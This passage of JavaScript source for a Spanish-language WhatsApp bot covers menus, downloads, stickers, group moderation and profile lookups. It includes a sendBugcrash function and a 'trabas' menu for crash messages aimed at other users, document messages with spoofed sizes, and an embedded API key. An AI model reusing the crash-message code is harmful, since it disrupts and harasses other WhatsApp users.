                    share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
                    views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
                    type: $(b).find('source').attr('type') || 'image/jpeg',
                    video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
                    video_2: $(b).find('video > a').attr('href') || ''
                })
            })
            resolve(hasil)
        })
    })
}


async function sendBugcrash(jid, title, description, footer, thumbnail, ownerBusines, produk, productIdImg) {
let prod = {
listMessage: {
title: title,
description: description,
listType: 2,
productListInfo: {
productSections: [{
title: title,
products: produk
}],
headerImage: {
productId: productIdImg,
jpegThumbnail: thumbnail
},
businessOwnerJid: ownerBusines
},
footerText: footer,
}
}
let progene = await generateWAMessageFromContent(jid, prod, { quoted : troli })
return conn.relayMessage(progene.key.remoteJid, progene.message, {
messageId: ""
})
}

async function replyprem(teks) {
    let buttons = [
    { buttonId: '.buypremium', buttonText: { displayText: '⬆️ Actualizar a premium' }, type: 1 }
    ]
    return conn.sendButtonText(m.chat, buttons, teks, `Eres usuario no premium :(`, m)
}

if (/hehe/g.test(m.body)) {
let reactionMessage = proto.Message.ReactionMessage.create({ key: m.key, text: "" })
conn.relayMessage(m.chat, { reactionMessage }, { messageId: "ppppp" })
}

if (autodltt) {
if (/(?:http(?:s|):\/\/|)(?:www\.|)(?:tiktok.com)\/@([-_0-9A-Za-z\.]{3,20})\/video\/([0-9]{19,25})?.(?:sender_device=pc&sender_web_id=[0-9]{19,25})&.(?:s_from_webapp=v1&is_copy_url=[0-9]{1})|(?:http(?:s|)):\/\/(?:(?:vt.|vm.)tiktok.com)\/(?:[a-z0-9A-Z]{9,15}\/)|(?:http(?:s|)):\/\/(?:t.tiktok.com)\/(?:i18n\/share\/video)\/([&\?\/a-zA-Z0-9=_-]{333,400})/.test(body) && !body.startsWith(prefix)) {
url = body.match(/(?:http(?:s|):\/\/|)(?:www\.|)(?:tiktok.com)\/@([-_0-9A-Za-z\.]{3,20})\/video\/([0-9]{19,25})?.(?:sender_device=pc&sender_web_id=[0-9]{19,25})&.(?:s_from_webapp=v1&is_copy_url=[0-9]{1})|(?:http(?:s|)):\/\/(?:(?:vt.|vm.)tiktok.com)\/(?:[a-z0-9A-Z]{9,15}\/)|(?:http(?:s|)):\/\/(?:t.tiktok.com)\/(?:i18n\/share\/video)\/([&\?\/a-zA-Z0-9=_-]{333,400})/)[0] 
let atdl = await tiktokdl(url)
let buttons = [
{ buttonId: `.tiktokvideo ${url}`, buttonText: { displayText: 'Video' }, type: 1 },
{ buttonId: `.tiktokaudio ${url}`, buttonText: { displayText: 'Audio' }, type: 1 }
]
await conn.sendButtonText(m.chat, buttons, `Tiktok

Titulo : ${atdl.title}`, `Descarga automática by 𝐏𝚯͢𝐖𝐄𝐑 - 𝐌𝐃`, ftext)
}
}

if (autosticker) {
if (/image/.test(mime) && !/webp/.test(mime)) {
let media = await quoted.download()
let encmedia = await conn.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime) && !/webp/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return 
let media = await quoted.download()
let encmedia = await conn.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
}
}

if (AntiLink) {
linkgce = await conn.groupInviteCode(from)
if (budy.includes(`https://chat.whatsapp.com/${linkgce}`)) {
} else if (isUrl(m.text)) {
if (isGroupAdmins) return 
if (!m.key.fromMe) return 
if (!itsMeHyzd) return 
kice = m.sender
await conn.groupParticipantsUpdate(from, [kice], 'remove').then((res) => enviar(jsonformat(res))).catch((err) => enviar(jsonformat(err)))
conn.sendMessage(from, {text:`Link Detectado, @${kice.split("@")[0]} eliminado `, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
}

/*if (m.isGroup && !m.key.fromMe && !itsMeHyzd && antilink) {
if (!isBotAdmins) return
if (budy.match(`chat.whatsapp.com`)) {
conn.sendMessage(m.chat, {text: `*Link detectado, ${pushname} eliminado...*`}, {quoted:m})
conn.groupParticipantsUpdate(m.chat, [sender], 'remove')
}
}*/

if (m.isGroup && !m.key.fromMe && !itsMeHyzd && antiwame) {
if (!isBotAdmins) return
if (budy.match(`wa.me`)) {
conn.sendMessage(m.chat, {text: `*Link detectado, ${pushname} eliminado...*`}, {quoted:m})
conn.groupParticipantsUpdate(m.chat, [sender], 'remove')
}
}

if (!isCmd && m.isGroup && isAlreadyResponList(m.chat, chath, db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, chath, db_respon_list)
if (get_data_respon.isImage === false) {
conn.sendMessage(m.chat, { text: sendResponList(m.chat, chath, db_respon_list) }, { quoted: m })
} else {
buff = await getBuffer(get_data_respon.image_url)
conn.sendImage(m.chat, buff, `${get_data_respon.response}`, m)
}
}

const nebal = (angka) => {
return Math.floor(angka)
}

if (!isCmd && isAlreadykaylaList(chath, dblist)) {
var getkaydata = getDataconnList(chath, dblist)
if (getkaydata.isImage === false) {
conn.sendMessage(m.chat, { text: sendconnList(chath, dblist) }, { quoted: m })
} else {
buff = await getBuffer(getkaydata.image_url)
conn.sendImage(m.chat, buff, `${getkaydata.response}`, m)
}
}

const seactions = [{
title: `${wm}`,
rows: [
{title: ` ᴍᴇɴᴜ ᴄᴏᴍᴘʟᴇᴛᴏ `, rowId: `${prefix}allmenu`},
{title: `ᴍᴇɴᴜ ᴘʀᴏᴘɪᴇᴛᴀʀɪᴏ `, rowId: `${prefix}ownermenu`},
{title: ` ᴏᴛʀᴏs ᴄᴏᴍᴀɴᴅᴏs `, rowId: `${prefix}othermenu`},
{title: ` ᴍᴇɴᴜ ᴅᴇsᴄᴀʀɢᴀ `, rowId: `${prefix}downloadmenu`},
{title: ` ᴍᴇɴᴜ ɴsғᴡ `, rowId: `${prefix}nsfwmenu`},
{title: ` ᴍᴇɴᴜ ᴀɴɪᴍᴇ `, rowId: `${prefix}menuanime`},
{title: ` ᴍᴇɴᴜ ᴛʀᴀʙᴀs `, rowId: `${prefix}bugmenu`},
{title: ` ᴍᴇɴᴜ ɢʀᴜᴘᴏ `, rowId: `${prefix}groupmenu`},
{title: ` ᴍᴇɴᴜ sᴛᴀʟᴋ `, rowId: `${prefix}stalkermenu`},
{title: ` ᴍᴇɴᴜ ғᴏᴛᴏ `, rowId: `${prefix}randfotomenu`},
{title: ` ᴍᴇɴᴜ ᴛᴇxᴛᴘʀᴏ `, rowId: `${prefix}textpromenu`},
{title: ` ᴍᴇɴᴜ ᴘʜᴏᴛᴏ ᴏxʏ `, rowId: `${prefix}photooxymenu`},
{title: ` ᴍᴇɴᴜ ᴇᴘʜᴏᴛᴏ 360 `, rowId: `${prefix}ephoto360menu`},
]}]
const listMenuMessage = { 
text: `Hola @${sender.split("@")[0]} Toque el boton de abajo para seleccionar su menu.`,
mentions: [sender],
footer: wm,
buttonText: 'Lista de menus',
sections: seactions,
listType: 1}

switch (command) {
case 'serbot':
case 'jadibot': {
if (m.isGroup) return reply(mess.private)
//if (!isPrem) return replyprem(mess.premium)
jadibot(conn, m, from)
}
break
case 'listaserbot':
case 'listjadibot': 
try {
let user = [... new Set([...global.conns.filter(conn => conn.user).map(conn => conn.user)])]
te = "*⟦㌙⟧ 𝐋𝐢𝐬𝐭𝐚 𝐝𝐞 𝐬𝐞𝐫𝐛𝐨𝐭 ⟦㌙⟧*\n\n"
for (let i of user){
y = await conn.decodeJid(i.id)
te += " 🜌 *ᴜsᴜᴀʀɪᴏ* : @" + y.split("@")[0] + "\n"
te += " 🜌 *ɴᴏᴍʙʀᴇ* : " + i.name + "\n\n"
}
conn.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
reply(`𝐍𝐨 𝐡𝐚𝐲 𝐮𝐬𝐮𝐚𝐫𝐢𝐨 𝐪𝐮𝐞 𝐮𝐬𝐞𝐧 𝐞𝐥 𝐬𝐞𝐫𝐛𝐨𝐭 𝐚𝐮𝐧...`)
}
break

case 'buypremium': {
owned = '5493865402608@s.whatsapp.net'
reply(`Para ser premium habla con @${owned.split("@")[0]}`)
}
break

case 'stopserbot':
case 'shutdown':
//if (!itsMeHyzd) return reply(mess.owner)
await sleep(3000)
process.exit()
break
case 'owner':
case 'dueño': {
const repf = await conn.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, mentions: [sender] }, { quoted: m })
//conn.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, Nih Owner Ku Jangan Macam-macam Ya`, mentions: [sender]}, { quoted: repf })
}
break
case 'menu':{
//const tyds = await conn.sendMessage(from, buttonLocnya, { quoted : m })
conn.sendMessage(from, listMenuMessage, { quoted: m })
}
break
case 'allmenu': {
owned = '5493865402608@s.whatsapp.net'
allmenup =  `ʜᴏʟᴀ @${sender.split("@")[0]}\n_*ʙɪᴇɴᴠᴇɴɪᴅx ᴀʟ ᴍᴇɴᴜ*_\n\n${allmenuu(prefix, hituet)}`
let buttonse = [
{buttonId: `${prefix}owner`, buttonText: {displayText: `𝐏𝐫𝐨𝐩𝐢𝐞𝐭𝐚𝐫𝐢𝐨`}, type: 1}
]
fotoallmenu = await getBuffer(`https://api.lolhuman.xyz/api/welcomeimage?apikey=BrunoSobrino&img=${ppuser}&text=${pushname}`)
let buttonMessages = {
document: fs.readFileSync('./media/fake.txt'),
mimetype: `application/octet-stream`,
fileName: `  𝐌𝐞𝐧𝐮 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐨 `,
fileLength: 99999999999999,
pageCount: 999999,
caption: allmenup,
footer: `_Powered By @${owned.split("@")[0]}_`,
buttons: buttonse,
headerType: 4,
contextInfo:{externalAdReply: {
title: `${wm}`,
mediaType: 1,
renderLargerThumbnail: true,
showAdAttribution: true,
body: ``,
thumbnail: fotoallmenu,
"sourceUrl": 'https://github.com/Hyzdmod'
}}}
conn.sendMessage(m.chat, buttonMessages, { quoted: m})
}
break
case 'ownermenu':
sendconnMessage(from, { 
text: `ʜᴏʟᴀ @${sender.split("@")[0]}\n_*ʙɪᴇɴᴠᴇɴɪᴅx ᴀʟ ᴍᴇɴᴜ*_\n\n${ownermenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": fake, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://wa.me/5493865362492',
"sourceUrl": 'https://wa.me/5493865362492'
}
}
})
break
case 'othermenu':
sendconnMessage(from, { 
text: `ʜᴏʟᴀ @${sender.split("@")[0]}\n_*ʙɪᴇɴᴠᴇɴɪᴅx ᴀʟ ᴍᴇɴᴜ*_\n\n${othermenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": fake, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://wa.me/5493865362492',
"sourceUrl": 'https://wa.me/5493865362492'
}
}
})
break
case 'menuanime':
sendconnMessage(from, { 
text: `ʜᴏʟᴀ @${sender.split("@")[0]}\n_*ʙɪᴇɴᴠᴇɴɪᴅx ᴀʟ ᴍᴇɴᴜ*_\n\n${menuanime(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": fake, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://wa.me/5493865362492',
"sourceUrl": 'https://wa.me/5493865362492'
}
}
})
break
case 'nsfwmenu':
sendconnMessage(from, { 
text: `ʜᴏʟᴀ @${sender.split("@")[0]}\n_*ʙɪᴇɴᴠᴇɴɪᴅx ᴀʟ ᴍᴇɴᴜ*_\n\n${nsfwmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": fake, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://wa.me/5493865362492',
"sourceUrl": 'https://wa.me/5493865362492'
}
}
})
break
case 'downloadmenu':
sendconnMessage(from, { 
text: `ʜᴏʟᴀ @${sender.split("@")[0]}\n_*ʙɪᴇɴᴠᴇɴɪᴅx ᴀʟ ᴍᴇɴᴜ*_\n\n${downloadmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": fake, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://wa.me/5493865362492',
"sourceUrl": 'https://wa.me/5493865362492'
}
}
})
break
case 'bugmenu':
sendconnMessage(from, { 
text: `ʜᴏʟᴀ @${sender.split("@")[0]}\n_*ʙɪᴇɴᴠᴇɴɪᴅx ᴀʟ ᴍᴇɴᴜ*_\n\n${bugmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": fake, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://wa.me/5493865362492',
"sourceUrl": 'https://wa.me/5493865362492'
}
}
})
break
case 'groupmenu':
sendconnMessage(from, { 
text: `ʜᴏʟᴀ @${sender.split("@")[0]}\n_*ʙɪᴇɴᴠᴇɴɪᴅx ᴀʟ ᴍᴇɴᴜ*_\n\n${groupmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": fake, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://wa.me/5493865362492',
"sourceUrl": 'https://wa.me/5493865362492'
}
}
})
break
case 'stalkermenu':
sendconnMessage(from, { 
text: `ʜᴏʟᴀ @${sender.split("@")[0]}\n_*ʙɪᴇɴᴠᴇɴɪᴅx ᴀʟ ᴍᴇɴᴜ*_\n\n${stalkermenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": fake, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://wa.me/5493865362492',
"sourceUrl": 'https://wa.me/5493865362492'
}
}
})
break
case 'randfotomenu':
sendconnMessage(from, { 
text: `ʜᴏʟᴀ @${sender.split("@")[0]}\n_*ʙɪᴇɴᴠᴇɴɪᴅx ᴀʟ ᴍᴇɴᴜ*_\n\n${randfotomenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": fake, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://wa.me/5493865362492',
"sourceUrl": 'https://wa.me/5493865362492'
}
}
})
break
case 'textpromenu':
sendconnMessage(from, { 
text: `ʜᴏʟᴀ @${sender.split("@")[0]}\n_*ʙɪᴇɴᴠᴇɴɪᴅx ᴀʟ ᴍᴇɴᴜ*_\n\n${textpromenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": fake, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://wa.me/5493865362492',
"sourceUrl": 'https://wa.me/5493865362492'
}
}
})
break
case 'photooxymenu':
sendconnMessage(from, { 
text: `ʜᴏʟᴀ @${sender.split("@")[0]}\n_*ʙɪᴇɴᴠᴇɴɪᴅx ᴀʟ ᴍᴇɴᴜ*_\n\n${photooxymenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": fake, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://wa.me/5493865362492',
"sourceUrl": 'https://wa.me/5493865362492'
}
}
})
break
case 'ephoto360menu':
sendconnMessage(from, { 
text: `ʜᴏʟᴀ @${sender.split("@")[0]}\n_*ʙɪᴇɴᴠᴇɴɪᴅx ᴀʟ ᴍᴇɴᴜ*_\n\n${ephoto360menu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": fake, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://wa.me/5493865362492',
"sourceUrl": 'https://wa.me/5493865362492'
}
}
})
break
case 'q': case 'quoted': {
if (!m.quoted) return reply('Responde a un mensaje!!')
let wokwol = await conn.serializeM(await m.getQuotedObj())
if (!wokwol.quoted) return reply('El mensaje que respondiste no contiene una respuesta.')
await wokwol.quoted.copyNForward(m.chat, true)
}
break
case 'tts': case 'gtts':
if (!q) return reply(` Ej : ${prefix+command} yamate kudasai`)

const gtts = require('./lib/gtts')(`es`, q)
var bby = args.join(' ')
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
bby.length > 300 ? reply('El texto es muy largo')
: gtts.save(ranm, bby, function () {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
fs.unlinkSync(ranm)
buff = fs.readFileSync(rano)
if (err) return reply(mess.error)
conn.sendMessage(m.chat,{audio:buff, mimetype: "audio/mp4", ptt:true},{quoted:m})
fs.unlinkSync(rano)
})
})
break
case 'igprofile':
case 'ffstalk':{
if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`Ej: ${prefix+command} 946716486`)

eeh = await ffstalk.ffstalk(`${q}`)
reply(`*/ Freefire Profile \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break
case 'mlstalk': {
if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`Ej: ${prefix+command} 530793138|8129`)

let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
reply(`*/ Mobile Legengd Profile \\*

Username ${dat.userName}
Id : ${q.split("|")[0]}
Zoneid : ${q.split("|")[1]}`)
}
break
case 'npmstalk':{
if (!q) return reply(`Ej: ${prefix+command} @adiwajshing/baileys`)

eha = await npmstalk.npmstalk(q)
reply(`*/ Npm Stalk \\*

Nombre : ${eha.name}
Versión más reciente : ${eha.versionLatest}
Versión Publicada : ${eha.versionPublish}
Actualización de versión : ${eha.versionUpdate}
Dependencias más recientes : ${eha.latestDependencies}
Publicar dependencias : ${eha.publishDependencies}
Hora de publicación : ${eha.publishTime}
Última hora de publicación : ${eha.latestPublishTime}`)
}
break
case 'ghstalk':{
if (!q) return reply(`Ej: ${prefix+command} Hyzdmod`)

aj = await githubstalk.githubstalk(`${q}`)
conn.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Github Profile \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Tipo : ${aj.type}
Admin : ${aj.admin}
Compañia : ${aj.company}
Blog : ${aj.blog}
Locación : ${aj.location}
Email : ${aj.email}
Repositorio puplico : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Seguidores : ${aj.followers}
Siguiendo : ${aj.following}
Creado hace : ${aj.ceated_at}
Actualizado en : ${aj.updated_at}` }, { quoted: m } )
}
break
case 'ss': case 'ssweb':{
if (!q) return reply(`Ej: ${prefix+command} _link_`)

let hyzdss = await scp1.ssweb(q)
conn.sendMessage(m.chat,{image:hyzdss.result,caption:mess.succes},{quoted:m})
}
break
case 'entrar':
case 'join': {
if (!itsMeHyzd) return reply(mess.owner)
if (!text) return reply(`Ej: ${prefix+command} linkgp`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalido!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await conn.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'toonce': { 
if (!quoted) return reply(`Responde a Image/Video`)
if (/image/.test(mime)) {
anuan = await conn.downloadAndSaveMediaMessage(quoted)
conn.sendMessage(m.chat, {image: {url:anuan}, caption: `Listo`, fileLength: "99999999", viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anuanuan = await conn.downloadAndSaveMediaMessage(quoted)
conn.sendMessage(m.chat, {video: {url:anuanuan}, caption: `Listo`, fileLength: "99999999", viewOnce : true},{quoted: m })
}
}
break
case 'autodltt':
if (!itsMeHyzd) return reply(mess.owner)
if (args[0] == 'on') {
if (autodltt) return reply('*Ya activo!*')
autodltt = true
reply(`*${command} fue activado en este grupo*`)
} else if (args[0] == 'off') {
if (!autodltt) return reply('*Ya desactivado!*')
autodltt = false
reply(`*${command} fue desactivado en este grupo*`)
} else {
let buttons = [
{ buttonId: '.autodltt on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: '.autodltt off', buttonText: { displayText: 'Off' }, type: 1 }
]
await conn.sendButtonText(m.chat, buttons, `Modo Auto Descarga Tiktok`, `Para activar On, Para desactivar Off`, m)
}
break
case 'autosticker':
if (!itsMeHyzd) return reply(mess.owner)
if (args[0] == 'on') {
if (autosticker) return reply('*Ya esta activado!*')
autosticker = true
reply(`*${command} fue activado en este grupo*`)
} else if (args[0] == 'off') {
if (!autosticker) return reply('*Ya desactivado!*')
autosticker = false
reply(`*${command} fue desactivado en este grupo*`)
} else {
let buttons = [
{ buttonId: '.autosticker on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: '.autosticker off', buttonText: { displayText: 'Off' }, type: 1 }
]
await conn.sendButtonText(m.chat, buttons, `Modo Autosticker`, wm, m)
}
break
case 'bc':
if (!itsMeHyzd) return reply(mess.owner)
if (!q) return reply(`Y el texto?`)
let anu = await store.chats.all().map(v => v.id)
for (let yoi of anu) {
conn.sendMessage(yoi,{text:`[ DISFUNCIÓN ]

${q}

𝐏𝚯͢𝐖𝐄𝐑 - 𝐌𝐃 | © 𝐊𝚵𝐍𝐈𝐒𝐀𝐖𝐀 - 𝐃𝚵𝐕`})
}
reply(`Listo`)
break
case 'ban':{
if (!itsMeHyzd) return reply(mess.owner)
if (!q) return reply(`Uso: ${prefix+command} add/del numero\nEj: ${prefix+command} add/del 5493865392829`)
orgnye = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
let ceknye = await conn.onWhatsApp(orgnye)
if (ceknye.length == 0) return reply(`Introduce un número válido y registrado en WhatsApp!!!`)
const isBane = banUser ? banUser.includes(orgnye) : false
if (args[0] === "add") {
if (isBane) return reply('El usuario fue baneado')
conn.updateBlockStatus(orgnye, 'block')
reply(`Listo`)
} else if (args[0] === "del") {
if (!isBane) return reply('Usuario no baneado')
conn.updateBlockStatus(orgnye, 'unblock')
reply(`Listo`)
} else {
reply("Error")
}
}
break
case 'listblock': case 'listban': case 'blocklist': case 'banlist': {
try {
listBloxk = []
teskd = ``
listnyd = 1
for (let i of banUser) {
teskd += `\n${listnyd++}. @${i.split("@")[0]}`
listBloxk.push({
title: "+" + i.split("@")[0], rowId: `${prefix}ban del ${i.split("@")[0]}`, description: "toque para desbanear"})
}
teskd += `\n\n toque el botón para desbanear`
const sections = [
{
title: "Total de baneados " + banUser.length,
rows: listBloxk
}
]

const listMessage = {
text: teskd,
footer: fake,
title: "     「 Lista De participantes Baneados 」",
buttonText: "Ver lista",
mentions: await conn.parseMention(teskd),
sections
}
conn.sendMessage(from, listMessage, {quoted:m})
} catch {
reply("Ningún usuario está bloqueado")
}
}
break
case 'hentaivid': {
if (!isPrem) return replyprem(mess.premium)

sbe = await hentaivid()
cejd = sbe[Math.floor(Math.random(), sbe.length)]
conn.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
caption: `⭔ Titulo : ${cejd.title}
⭔ Categorías : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Vistas : ${cejd.views_count}
⭔ Compartidas : ${cejd.share_count}
⭔ Fuente : ${cejd.link}
⭔ Media Url : ${cejd.video_1}` }, { quoted: m })
}
break

case 'afk': {
if (!m.isGroup) return reply(mess.group)
if (!text) return reply(`Ej: ${prefix+command} estoy durmiendo`)
let user = global.db.users[m.sender]
user.afkTime = + new Date
user.afkReason = args.join(" ")
m.reply(`${m.pushName} estas en afk\nRazon : ${args.join(" ") ? args.join(" ") : ''}`)
}
break
case 'antilink': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMeHyzd) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (args[0] === "on") {
if (AntiLink) return reply('*Ya activo!*')
ntilink.push(m.chat)
reply(`*${command} fue activado en este grupo*`)
} else if (args[0] === "off") {
if (!AntiLink) return reply('*Ya desactivado!*')
let off = ntilink.indexOf(m.chat)
ntilink.splice(off, 1)
reply(`*${command} fue desactivado en este grupo*`)
} else {
let buttons = [
{ buttonId: prefix + 'antilink on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: prefix + 'antilink off', buttonText: { displayText: 'Off' }, type: 1 }
]
await conn.sendButtonText(m.chat, buttons, `Modo ` + command, wm, m)
}
}
break
/*case 'antilink':
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMeHyzd) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (args[0] == 'on') {
if (antilink) return reply('*Ya activo!*')
antilink = true
reply(`*${command} fue activado en este grupo*`)
} else if (args[0] == 'off') {
if (!antilink) return reply('*Ya desactivado!*')
antilink = false
reply(`*${command} fue desactivado en este grupo*`)
} else {
let buttons = [
{ buttonId: '.antilink on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: '.antilink off', buttonText: { displayText: 'Off' }, type: 1 }
]
await conn.sendButtonText(m.chat, buttons, `Modo Antilink`, wm, m)
}
break*/
case 'antiwame':
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMeHyzd) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (args[0] == 'on') {
if (antiwame) return reply('*Ya activo!*')
antiwame = true
reply(`*${command} fue activado en este grupo*`)
} else if (args[0] == 'off') {
if (!antiwame) return reply('*Ya desactivado!*')
antiwame = false
reply(`*${command} fue desactivado en este grupo*`)
} else {
let buttons = [
{ buttonId: '.antiwame on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: '.antiwame off', buttonText: { displayText: 'Off' }, type: 1 }
]
await conn.sendButtonText(m.chat, buttons, `Modo Antiwame`, wm, m)
}
break
case 'add': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMeHyzd) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(`Miembro agregado`)).catch((err) => reply(jsonformat(err)))
}
break
case 'closetime':
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMeHyzd) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (args[1] == 'segundo') {
var timer = args[0] * `1000`
} else if (args[1] == 'minuto') {
var timer = args[0] * `60000`
} else if (args[1] == 'hora') {
var timer = args[0] * `3600000`
} else if (args[1] == 'dia') {
var timer = args[0] * `86400000`
} else {
return reply('*Use:*\nsegundo\nminuto\nhora\n\n*Ej:*\n10 segundo')
}
reply(`Hora de cierre ${q} empezando desde ahora`)
setTimeout(() => {
var nomor = m.participant
const close = `*A tiempo* grupo cerrado por administrador\n ahora solo el administrador puede enviar mensajes`
conn.groupSettingUpdate(from, 'announcement')
reply(close)
}, timer)
break
case 'opentime':
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMeHyzd) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (args[1] == 'segundo') {
var timer = args[0] * `1000`
} else if (args[1] == 'minuto') {
var timer = args[0] * `60000`
} else if (args[1] == 'hora') {
var timer = args[0] * `3600000`
} else if (args[1] == 'dia') {
var timer = args[0] * `86400000`
} else {
return reply('*Use:*\nsegundo\nminuto\nhora\n\n*Ej:*\n10 segundo')
}
reply(`Hora de apertura ${q} empezando desde ahora`)
setTimeout(() => {
var nomor = m.participant
const open = `*A tiempo* grupo abierto por administrador\n ahora los miembros pueden enviar mensajes`
conn.groupSettingUpdate(from, 'not_announcement')
reply(open)
}, timer)
break
case 'kick': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMeHyzd) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(`Miembro eliminado`)).catch((err) => reply(jsonformat(err)))
}
break
case 'promote': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMeHyzd) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(`Miembro promovido con exito`)).catch((err) => reply(jsonformat(err)))
}
break
case 'demote': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMeHyzd) return reply(mess.admin)
